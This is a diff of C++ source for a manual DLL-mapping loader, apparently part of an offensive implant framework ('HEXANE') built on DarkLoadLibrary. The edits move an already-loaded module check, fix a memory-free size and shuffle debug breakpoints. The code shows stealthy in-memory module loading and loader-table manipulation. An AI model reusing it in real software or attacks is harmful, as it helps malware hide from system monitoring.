@@ -387,7 +387,6 @@ namespace Modules {
 			return false;
 		}
 
-		__debugbreak();
 		import_dire = &mod->nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
         if (import_dire->Size) {
 
@@ -555,10 +554,6 @@ namespace Modules {
 
         mod->base = mod->nt_head->OptionalHeader.ImageBase;
         region_size = (size_t) mod->nt_head->OptionalHeader.SizeOfImage;
-
-		__debugbreak();
-		// TODO: why the f are we re-mapping something that's already mapped? Shlwapi, kernel32 etc.
-		// this also triggers the SharedOriginal flag
 
         if (!NT_SUCCESS(ntstatus = ctx->win32.NtAllocateVirtualMemory(NtCurrentProcess(), (void**) &mod->base, 0, &region_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) ||
             mod->base != mod->nt_head->OptionalHeader.ImageBase ||
@@ -753,7 +748,7 @@ namespace Modules {
         }
 
         if (!ctx->win32.ReadFile(handle, mod->buffer, size, (DWORD*) &mod->size, nullptr)) {
-            ctx->win32.NtFreeVirtualMemory(NtCurrentProcess(), (VOID**) &mod->buffer, &mod->size, 0);
+            ctx->win32.NtFreeVirtualMemory(NtCurrentProcess(), (VOID**) &mod->buffer, &size, 0);
             ctx->win32.NtClose(handle);
             return false;
         }
@@ -802,7 +797,7 @@ namespace Modules {
         entry->InIndexes      = true;
         entry->ProcessAttachCalled = true;
         entry->InExceptionTable    = false;
-        entry->DllBase     = (void *) mod->base;
+        entry->DllBase     = (void*) mod->base;
         entry->SizeOfImage = nt_head->OptionalHeader.SizeOfImage;
         entry->TimeDateStamp = nt_head->FileHeader.TimeDateStamp;
         entry->BaseDllName = base_name;
@@ -837,13 +832,25 @@ namespace Modules {
         // NOTE: code based off of https://github.com/bats3c/DarkLoadLibrary
         HEXANE;
 
-        EXECUTABLE *mod = (EXECUTABLE *) ctx->win32.RtlAllocateHeap(ctx->heap, HEAP_ZERO_MEMORY, sizeof(EXECUTABLE));
+        EXECUTABLE *mod = (EXECUTABLE*) ctx->win32.RtlAllocateHeap(ctx->heap, HEAP_ZERO_MEMORY, sizeof(EXECUTABLE));
         if (!mod) {
             return nullptr;
         }
 
         mod->success = false;
         mod->link = true;
+
+		// check if this shit is already loaded instead of wasting time/resources/access violations
+		LDR_DATA_TABLE_ENTRY *check_mod = nullptr;
+
+		if (name_hash && (load_type & LoadBof) != LoadBof) { 
+			if (check_mod = FindModuleEntry(name_hash)) {
+                mod->base = (uintptr_t) check_mod->DllBase;
+                mod->success = true;
+
+				goto defer;
+			}
+		}
 
         switch (LOWORD(load_type)) {
             case LoadLocalFile: {
@@ -878,16 +885,7 @@ namespace Modules {
             name = mod->cracked_name;
         }
 
-		// see if we can find the mod already loaded in memory
-        if ((load_type & LoadBof) != LoadBof) {
-            if (LDR_DATA_TABLE_ENTRY *check_module = FindModuleEntry(HashStringW(name, WcsLength(name)))) {
-                mod->base = (uintptr_t) check_module->DllBase;
-                mod->success = true;
-
-                goto defer;
-            }
-        }
-
+		__debugbreak();
         FindHeaders(mod);
         if (!ImageCheckArch(mod)) {
             goto defer;
